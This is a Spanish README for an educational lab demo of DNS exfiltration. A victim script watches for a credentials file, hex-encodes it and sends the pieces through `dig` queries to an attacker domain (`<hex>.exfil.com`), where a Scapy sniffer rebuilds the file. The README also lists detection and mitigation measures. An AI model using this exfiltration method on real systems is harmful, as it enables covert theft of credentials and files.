# Exfiltración de Datos vía DNS

Prueba de concepto **educativa** que demuestra cómo un atacante puede extraer
información de una máquina comprometida usando el protocolo **DNS** como canal
encubierto (*DNS tunneling / exfiltration*). El material forma parte de una
exposición académica sobre seguridad ofensiva y defensiva.

> ⚠️ **Aviso legal y ético**
>
> Este proyecto es **exclusivamente educativo** y está pensado para ejecutarse
> en un **laboratorio controlado y aislado**, con equipos y redes de tu
> propiedad o sobre los que tengas **autorización explícita por escrito**.
> Usar estas técnicas contra sistemas ajenos es **ilegal**. El autor no se
> responsabiliza del mal uso de este material.

---

## ¿Por qué DNS?

El tráfico DNS casi siempre está permitido de salida en las redes corporativas,
rara vez se inspecciona en profundidad y suele pasar por alto en los firewalls.
Eso lo convierte en un canal atractivo para sacar datos de una red: en lugar de
abrir una conexión directa al atacante, el malware "esconde" la información
dentro de los nombres de dominio que consulta.

La idea central de esta demo:

1. La víctima convierte el archivo a extraer en **hexadecimal**.
2. Cada fragmento se envía como el **subdominio** de una consulta DNS hacia un
   dominio controlado por el atacante (`<datos_hex>.exfil.com`).
3. El atacante **escucha** las consultas DNS, extrae el subdominio y
   **reconstruye** el archivo original.

```
┌───────────┐   dig <hex>.exfil.com   ┌──────────────┐
│  VÍCTIMA  │ ──────────────────────▶ │   ATACANTE   │
│ malware.sh│      (puerto 53/UDP)    │monitor_dns.py│
└───────────┘                         └──────────────┘
   lee y                                  captura y
 codifica el                            reconstruye el
   archivo                                 archivo
```

---

## Estructura del repositorio

```
.
├── attacker/
│   └── monitor_dns.py   # Sniffer que captura y reconstruye los datos (Scapy)
├── victim/
│   └── malware.sh       # Simula el malware que exfiltra el archivo vía DNS
├── presentacion/        # Diapositivas y PDF de la exposición
├── video/               # Vídeo explicativo y recursos gráficos
└── README.md
```

---

## Requisitos

**Atacante (equipo que recibe los datos)**

- Python 3
- [Scapy](https://scapy.net/) → `pip install scapy`
- Permisos de root (captura de paquetes en crudo)

**Víctima (equipo comprometido simulado)**

- `inotify-tools` (proporciona `inotifywait`)
- `xxd` (incluido en la mayoría de distribuciones)
- `dig` (paquete `dnsutils` / `bind-utils`)

---

## Configuración

En `attacker/monitor_dns.py` ajusta la **interfaz de red** por la que escucharás:

```python
INTERFAZ = "enp0s31f6"   # consúltala con: ip a
DOMINIO  = ".exfil.com"  # dominio usado como canal
```

En `victim/malware.sh` el directorio y archivo vigilados están definidos al
inicio del script (`DIR` y `ARCHIVO`); modifícalos según tu laboratorio.

---

## Uso en laboratorio

**1. En la máquina atacante**, lanza el monitor (requiere root para capturar):

```bash
sudo python3 attacker/monitor_dns.py
```

**2. En la máquina víctima**, arranca el script indicando la IP del atacante:

```bash
./victim/malware.sh <IP_atacante>
```

El script queda a la espera. En cuanto el archivo vigilado
(`credenciales.txt`) se cree o modifique en el directorio observado, lo
codifica en hexadecimal y envía cada fragmento como una consulta DNS hacia el
atacante.

**3.** En la terminal del atacante verás cómo se capturan los paquetes y se
reconstruye el contenido del archivo fragmento a fragmento.

---

## Cómo funciona por dentro

**`victim/malware.sh`**

- Usa `inotifywait -m` para vigilar en tiempo real el directorio objetivo.
- Al detectar que el archivo objetivo se escribe/crea, lo trocea con
  `xxd -p -c 20` (20 bytes por línea → un fragmento hex por consulta).
- Envía cada fragmento con `dig @<atacante> <hex>.exfil.com`, descartando la
  respuesta: lo relevante es que la **consulta** llegue al atacante.

**`attacker/monitor_dns.py`**

- Con Scapy, hace `sniff()` del tráfico `udp port 53` en la interfaz indicada.
- Filtra las consultas cuyo nombre contiene el dominio `exfil.com`.
- Toma la primera etiqueta del `QNAME` (los datos hex), la decodifica con
  `bytes.fromhex()` y la va acumulando para reconstruir el archivo original.
- Muestra metadatos del paquete (origen, QNAME completo, flags DNS) con fines
  didácticos.

---

## Detección y mitigación (lado defensivo)

El objetivo real de la demo es entender el ataque **para poder defenderse**.
Algunas contramedidas:

- **Inspección del tráfico DNS**: alertar ante nombres de dominio anormalmente
  largos, con alta entropía o un volumen inusual de consultas a un mismo dominio.
- **DNS corporativo obligatorio**: forzar que todo el tráfico DNS pase por
  resolutores internos y bloquear el puerto 53 hacia el exterior.
- **Listas de reputación / bloqueo** de dominios sospechosos y recién
  registrados.
- **Límite de tasa (rate limiting)** de consultas por host.
- **Monitorización de endpoints (EDR)**: detectar procesos que lanzan
  `dig`/`nslookup` de forma masiva o herramientas de tunneling.
- **DLP**: controlar la salida de archivos sensibles del host.

---

## Material de la exposición

- `presentacion/` — diapositivas (`.pptx`) y PDF de la charla.
- `video/exfiltracion-dns_1080p60.mp4` — vídeo explicativo de la demostración.

---

## Licencia y uso

Material con fines **educativos y de concienciación en seguridad**. Úsalo de
forma **responsable y legal**, únicamente en entornos autorizados.
